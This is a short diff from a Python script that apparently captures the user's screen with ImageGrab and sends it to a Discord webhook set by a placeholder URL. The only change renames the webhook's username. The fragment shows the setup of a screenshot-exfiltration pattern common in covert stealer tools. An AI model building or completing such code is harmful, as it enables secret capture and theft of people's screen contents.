@@ -6,7 +6,7 @@ try:
 except:
     pass
 
-webhook = discord_webhook.DiscordWebhook(url='WEBHOOK HERE', username="Webhook with files")
+webhook = discord_webhook.DiscordWebhook(url='WEBHOOK HERE', username="Screenshot")
 
 image = ImageGrab.grab(
         bbox=None,
